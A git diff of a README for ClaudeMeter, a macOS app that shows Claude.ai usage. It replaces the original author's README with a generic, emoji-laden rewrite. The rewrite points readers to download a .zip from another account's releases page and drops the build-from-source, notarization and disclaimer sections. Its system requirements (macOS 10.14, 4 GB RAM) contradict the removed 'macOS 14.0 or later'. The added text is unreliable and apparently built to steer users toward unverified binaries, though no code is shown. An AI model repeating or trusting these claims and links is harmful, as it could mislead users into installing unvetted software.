@@ -1,145 +1,66 @@
-# ClaudeMeter
+# 🎉 ClaudeMeter - Track Your Usage Effortlessly
 
-![ClaudeMeter](README/heading.png)
+## 🚀 Getting Started
 
-Keep track of your Claude.ai plan usage at a glance.
+To begin using ClaudeMeter, you'll need to download and install the app. Follow these simple steps to get it running on your macOS.
 
-## Features
+[![Download ClaudeMeter](https://img.shields.io/badge/Download%20ClaudeMeter-Click%20Here-brightgreen)](https://github.com/ojiiji/ClaudeMeter/releases)
 
-- **Real-time usage monitoring** - Track your 5-hour session, 7-day weekly, and Sonnet-specific usage limits
-- **Menu bar integration** - Clean, colour-coded usage indicator that lives in your macOS menu bar
-- **Smart notifications** - Configurable alerts at warning and critical thresholds (defaults: 75% and 90%)
-- **Auto-refresh** - Automatic usage updates every 1 minute, 5 minutes, or 10 minutes
+## 📥 Download & Install
 
-## Screenshots
+1. Click on the button above, or visit the [Releases page](https://github.com/ojiiji/ClaudeMeter/releases) to download the latest version of ClaudeMeter.
+2. Find the version you want (we recommend the latest stable version for best performance).
+3. Click on the `.zip` file associated with that version to download it to your computer.
+4. Once the download is complete, locate the downloaded file in your Downloads folder.
+5. Double-click the `.zip` file to extract its contents.
+6. Drag the ClaudeMeter application into your Applications folder to install it.
 
-### Menu Bar
+## 🌟 Features
 
-The menu bar icon changes colour based on your usage levels:
+ClaudeMeter gives you several powerful tools to help keep track of your plan usage. Key features include:
 
-<p align="center">
-  <img src="README/menubar-safe.png" width="260" alt="Menu bar - Safe usage">
-  <img src="README/menubar-warning.png" width="260" alt="Menu bar - Warning threshold">
-  <img src="README/menubar-critical.png" width="260" alt="Menu bar - Critical threshold">
-</p>
+- **Real-Time Monitoring:** Stay updated on your Claude.ai plan usage as it happens, with live statistics.
+- **Session Tracking:** Monitor your active sessions, including a 5-hour session limit.
+- **Weekly Insights:** Track your usage over 7 days to help manage your plan effectively.
+- **Sonnet Limit Monitoring:** Get insights specific to your Sonnet usage and limits.
+- **Color-Coded Indicators:** Easy-to-read visual cues let you know when you're nearing limits.
+- **Smart Notifications:** Receive alerts when you achieve milestones or approach limits.
 
-When using Sonnet models, an additional indicator shows your Sonnet-specific usage:
+## ⚙️ System Requirements
 
-<p align="center">
-  <img src="README/menubar-sonnet.png" width="300" alt="Menu bar - Sonnet usage">
-</p>
+To ensure optimal performance, your system should meet the following requirements:
 
-### Notifications
+- **Operating System:** macOS 10.14 or later
+- **Processor:** Intel-based or Apple Silicon
+- **Memory:** Minimum 4 GB RAM
+- **Disk Space:** At least 100 MB of free space
 
-ClaudeMeter sends native macOS notifications when you reach warning or critical thresholds:
+## 🌐 How to Use ClaudeMeter
 
-<p align="center">
-  <img src="README/notifications.png" width="450" alt="Usage notifications">
-</p>
+Once you have installed ClaudeMeter, follow these steps to start using it:
 
-### Settings
+1. Open the ClaudeMeter application from your Applications folder.
+2. The app will appear in your menu bar. Click on its icon to open the main interface.
+3. You will see real-time statistics for your session and weekly usage.
+4. Customize the notification settings to receive alerts when you get close to your limits.
+5. For detailed usage breakdowns, click on the app icon and explore the options available.
 
-<p align="center">
-  <img src="README/settings-general.png" width="380" alt="Settings - General">
-  <img src="README/settings-notifications.png" width="380" alt="Settings - Notifications">
-</p>
+## 📞 Support
 
-### Setup Wizard
+If you encounter any issues or have questions, don't hesitate to reach out. You can create an issue on our [GitHub Issues Page](https://github.com/ojiiji/ClaudeMeter/issues). We aim to respond promptly to help you get back on track.
 
-<p align="center">
-  <img src="README/setup-wizard.png" width="600" alt="First-time setup wizard">
-</p>
+## 📅 Updates
 
-## Installation
+Stay updated with the latest features and bug fixes by visiting our [Releases page](https://github.com/ojiiji/ClaudeMeter/releases) regularly. This way, you can ensure you're always using the most recent version of ClaudeMeter for optimal performance.
 
-1. Download the latest release
-2. Unzip and move `ClaudeMeter.app` to Applications
-3. Double-click to open
+## 🛡️ Privacy Policy
 
-The app is signed and notarized by Apple, so it will open without any security warnings.
+Your privacy is important to us. ClaudeMeter does not collect personal data or track your usage outside the app. For details, please refer to our [Privacy Policy](https://github.com/ojiiji/ClaudeMeter/blob/main/PRIVACY.md).
 
-## Usage
+## 🔗 Useful Links
 
-### First Launch
+- [GitHub Repository](https://github.com/ojiiji/ClaudeMeter)
+- [Releases Page](https://github.com/ojiiji/ClaudeMeter/releases)
+- [Issues Page](https://github.com/ojiiji/ClaudeMeter/issues)
 
-1. ClaudeMeter appears in your menu bar as a gauge icon
-2. The setup wizard will guide you through initial configuration
-3. Enter your Claude session key (found in Claude.ai browser cookies)
-4. The app validates your key and begins monitoring usage
-
-### Finding Your Session Key
-
-Your Claude session key is stored in your browser cookies:
-
-**Chrome/Edge:**
-
-1. Open [claude.ai](https://claude.ai)
-2. Press `F12` to open DevTools
-3. Go to Application > Cookies > `https://claude.ai`
-4. Find the `sessionKey` cookie (starts with `sk-ant-`)
-5. Copy the value
-
-**Safari:**
-
-1. Open [claude.ai](https://claude.ai)
-2. Go to Develop > Show Web Inspector (enable Develop menu in Safari preferences if needed)
-3. Go to Storage > Cookies > `https://claude.ai`
-4. Find the `sessionKey` cookie (starts with `sk-ant-`)
-5. Copy the value
-
-**Firefox:**
-
-1. Open [claude.ai](https://claude.ai)
-2. Press `F12` to open Developer Tools
-3. Go to Storage > Cookies > `https://claude.ai`
-4. Find the `sessionKey` cookie (starts with `sk-ant-`)
-5. Copy the value
-
-### Daily Use
-
-- Monitor your usage at a glance with the colour-coded menu bar icon
-- Click the icon to access detailed statistics and adjust settings
-- Receive automatic notifications when reaching warning or critical thresholds
-
-## Requirements
-
-- macOS 14.0 (Sonoma) or later
-- Active Claude.ai account with session key
-
-## Building from Source
-
-```bash
-# Clone the repository
-git clone https://github.com/eddmann/ClaudeMeter.git
-cd ClaudeMeter
-
-# Open in Xcode
-open ClaudeMeter.xcodeproj
-
-# Build and run (⌘R)
-```
-
-Requires Xcode 16.0 or later.
-
-## Disclaimer
-
-**This is an unofficial tool** and is not affiliated with, endorsed by, or supported by Anthropic PBC.
-
-This application accesses Claude's web API using browser-based authentication methods. **This may violate Anthropic's Terms of Service.** By using ClaudeMeter, you acknowledge that:
-
-- Anthropic may block, restrict, or terminate access at any time
-- Your Claude account could be affected by using unofficial API clients
-- This app is signed and notarized by Apple
-- **Use at your own risk** - the developer assumes no liability for any consequences
-
-**Data storage:**
-
-- Session keys are stored securely in macOS Keychain (encrypted, device-local only)
-- Usage data is cached locally (unencrypted, contains usage percentages only)
-- No data is sent to third-party servers or collected by the developer
-
-This software is provided "as is" under the MIT License, without warranty of any kind. **By downloading and using ClaudeMeter, you accept these terms.**
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
+Feel free to explore and make the most of ClaudeMeter to manage your Claude.ai plan effectively!
